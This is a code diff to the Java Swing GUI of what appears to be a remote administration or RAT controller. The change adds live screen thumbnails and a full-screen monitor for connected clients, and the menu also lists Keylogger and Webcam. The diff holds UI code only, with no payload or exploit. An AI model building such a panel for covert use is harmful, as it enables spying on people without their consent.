@@ -3,16 +3,24 @@ import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
+import java.util.HashMap;
+import java.util.Map;
 import javax.swing.*;
 import javax.swing.table.DefaultTableCellRenderer;
 import javax.swing.table.DefaultTableModel;
 import javax.swing.tree.DefaultMutableTreeNode;
+import java.awt.image.BufferedImage;
 
 public class AdminServerApp extends JFrame {
 
     private JTextArea eventLog;
     private JPanel clientGrid;
     private AdminServerController controller;
+    private JLabel onlineInfoLabel;
+    private Map<String, JLabel> screenLabels = new HashMap<String, JLabel>();
+    private Map<String, JPanel> clientCards = new HashMap<String, JPanel>();
+    private Map<String, JLabel> bigScreenLabels = new HashMap<String, JLabel>();
+    private Map<String, BufferedImage> latestScreens = new HashMap<String, BufferedImage>();
 
     private final Color BG = new Color(7, 7, 8);
     private final Color PANEL = new Color(15, 17, 20);
@@ -123,8 +131,6 @@ public class AdminServerApp extends JFrame {
         sidebar.add(Box.createVerticalStrut(22));
 
         sidebar.add(createMenuButton("Dashboard", "Dashboard.png", true));
-        sidebar.add(createMenuButton("Clients", "clients.png", false));
-        sidebar.add(createMenuButton("Screen Monitor", "computer.png", false));
         sidebar.add(createMenuButton("Webcam", "webcam.png", false));
         sidebar.add(createMenuButton("Keylogger", "keyboard.png", false));
         sidebar.add(createMenuButton("Task Manager", "task.png", false));
@@ -134,16 +140,15 @@ public class AdminServerApp extends JFrame {
 
         sidebar.add(Box.createVerticalGlue());
 
-        JLabel info = new JLabel(
+        onlineInfoLabel = new JLabel(
                 "<html><div style='padding-left:26px;color:white;'>"
-                        + "<span style='color:#ef2331;'>●</span> Online: 6<br>"
-                        + "<span style='color:#777777;'>●</span> Offline: 0<br>"
+                        + "<span style='color:#ef2331;'>●</span> Online: 0<br>"
                         + "Port: <span style='color:#ef2331;'>1412</span>"
                         + "</div></html>"
         );
-        info.setFont(new Font("Segoe UI", Font.PLAIN, 14));
-        info.setAlignmentX(Component.LEFT_ALIGNMENT);
-        sidebar.add(info);
+        onlineInfoLabel.setFont(new Font("Segoe UI", Font.PLAIN, 14));
+        onlineInfoLabel.setAlignmentX(Component.LEFT_ALIGNMENT);
+        sidebar.add(onlineInfoLabel);
 
         return sidebar;
     }
@@ -421,17 +426,20 @@ public class AdminServerApp extends JFrame {
         top.add(statusLabel, BorderLayout.EAST);
 
         JLabel preview = new JLabel(
-                "<html><div style='text-align:center;color:#b0b0b0;'>"
-                        + "<div style='font-size:28px;color:#333333;'>▭</div>"
-                        + "CONNECTED CLIENT"
-                        + "</div></html>",
-                SwingConstants.CENTER
-        );
+        "<html><div style='text-align:center;color:#b0b0b0;'>"
+                + "<div style='font-size:28px;color:#333333;'>▭</div>"
+                + "CONNECTED CLIENT"
+                + "</div></html>",
+        SwingConstants.CENTER
+);
+
         preview.setOpaque(true);
         preview.setBackground(new Color(10, 12, 15));
         preview.setForeground(MUTED);
         preview.setFont(new Font("Segoe UI", Font.PLAIN, 13));
         preview.setBorder(BorderFactory.createLineBorder(new Color(65, 65, 70), 1));
+
+        screenLabels.put(clientName, preview);
 
         JPanel infoPanel = new JPanel(new GridLayout(2, 2, 10, 6));
         infoPanel.setBackground(PANEL);
@@ -445,8 +453,91 @@ public class AdminServerApp extends JFrame {
         card.add(top, BorderLayout.NORTH);
         card.add(preview, BorderLayout.CENTER);
         card.add(infoPanel, BorderLayout.SOUTH);
+        card.addMouseListener(new MouseAdapter() {
+            public void mouseClicked(MouseEvent e) {
+                if (e.getClickCount() == 2) {
+                    addLog("[SCREEN] Open big screen for " + clientName);
+                    openBigScreen(clientName);
+                }
+            }
 
+            public void mouseEntered(MouseEvent e) {
+                card.setBorder(BorderFactory.createCompoundBorder(
+                        BorderFactory.createLineBorder(RED, 1),
+                        BorderFactory.createEmptyBorder(12, 14, 12, 14)
+                ));
+            }
+
+            public void mouseExited(MouseEvent e) {
+                card.setBorder(BorderFactory.createCompoundBorder(
+                        BorderFactory.createLineBorder(BORDER, 1),
+                        BorderFactory.createEmptyBorder(12, 14, 12, 14)
+                ));
+            }
+        });
+
+        clientCards.put(clientName, card);
         clientGrid.add(card);
+        clientGrid.revalidate();
+        clientGrid.repaint();
+    });
+}
+// Hàm này sẽ được gọi từ ClientHandler khi nhận được hình ảnh mới từ client
+    public void updateClientScreen(String clientName, BufferedImage image) {
+    SwingUtilities.invokeLater(() -> {
+        latestScreens.put(clientName, image);
+
+        JLabel smallLabel = screenLabels.get(clientName);
+
+        if (smallLabel != null) {
+            Image smallImg = image.getScaledInstance(
+                    smallLabel.getWidth(),
+                    smallLabel.getHeight(),
+                    Image.SCALE_FAST
+            );
+
+            smallLabel.setText("");
+            smallLabel.setIcon(new ImageIcon(smallImg));
+        }
+
+        JLabel bigLabel = bigScreenLabels.get(clientName);
+
+        if (bigLabel != null) {
+            Image bigImg = image.getScaledInstance(
+                    bigLabel.getWidth(),
+                    bigLabel.getHeight(),
+                    Image.SCALE_SMOOTH
+            );
+
+            bigLabel.setText("");
+            bigLabel.setIcon(new ImageIcon(bigImg));
+        }
+    });
+}
+// Hàm này sẽ được gọi khi client ngắt kết nối hoặc bị ngắt kết nối
+public void removeClientCard(String clientName) {
+    SwingUtilities.invokeLater(() -> {
+        JPanel card = clientCards.get(clientName);
+
+        if (card != null) {
+            clientGrid.remove(card);
+            clientCards.remove(clientName);
+            screenLabels.remove(clientName);
+            latestScreens.remove(clientName);
+
+            clientGrid.revalidate();
+            clientGrid.repaint();
+        }
+    });
+}
+    public void clearClientCards() {
+    SwingUtilities.invokeLater(() -> {
+        clientGrid.removeAll();
+        screenLabels.clear();
+        clientCards.clear();
+        latestScreens.clear();
+        bigScreenLabels.clear();
+
         clientGrid.revalidate();
         clientGrid.repaint();
     });
@@ -861,6 +952,71 @@ public class AdminServerApp extends JFrame {
 
         return new ImageIcon(scaledImage);
     }
+
+    // Hàm này sẽ được gọi khi người dùng double-click vào client
+    private void openBigScreen(String clientName) {
+    JDialog dialog = new JDialog(this, "Screen Monitor - " + clientName, false);
+    dialog.setSize(1000, 650);
+    dialog.setLocationRelativeTo(this);
+    dialog.setLayout(new BorderLayout());
+    dialog.getContentPane().setBackground(BG);
+
+    JLabel title = new JLabel("  LIVE SCREEN - " + clientName);
+    title.setForeground(TEXT);
+    title.setFont(new Font("Segoe UI", Font.BOLD, 22));
+    title.setOpaque(true);
+    title.setBackground(BG);
+    title.setBorder(BorderFactory.createCompoundBorder(
+            BorderFactory.createMatteBorder(1, 1, 1, 1, RED),
+            BorderFactory.createEmptyBorder(14, 18, 14, 18)
+    ));
+
+    JLabel screen = new JLabel("WAITING SCREEN...", SwingConstants.CENTER);
+    screen.setOpaque(true);
+    screen.setBackground(Color.BLACK);
+    screen.setForeground(MUTED);
+    screen.setFont(new Font("Consolas", Font.BOLD, 24));
+    screen.setBorder(BorderFactory.createLineBorder(RED, 1));
+
+    bigScreenLabels.put(clientName, screen);
+
+    BufferedImage lastImage = latestScreens.get(clientName);
+
+    if (lastImage != null) {
+        Image bigImg = lastImage.getScaledInstance(
+                1000,
+                560,
+                Image.SCALE_SMOOTH
+        );
+
+        screen.setText("");
+        screen.setIcon(new ImageIcon(bigImg));
+    }
+
+    dialog.add(title, BorderLayout.NORTH);
+    dialog.add(screen, BorderLayout.CENTER);
+
+    dialog.addWindowListener(new java.awt.event.WindowAdapter() {
+        public void windowClosing(java.awt.event.WindowEvent e) {
+            bigScreenLabels.remove(clientName);
+        }
+    });
+
+    dialog.setVisible(true);
+}
+
+    public void updateOnlineCount(int count) {
+    SwingUtilities.invokeLater(() -> {
+        if (onlineInfoLabel != null) {
+            onlineInfoLabel.setText(
+                    "<html><div style='padding-left:26px;color:white;'>"
+                            + "<span style='color:#ef2331;'>●</span> Online: " + count + "<br>"
+                            + "Port: <span style='color:#ef2331;'>1412</span>"
+                            + "</div></html>"
+            );
+        }
+    });
+}
 
 
     public static void main(String[] args) {
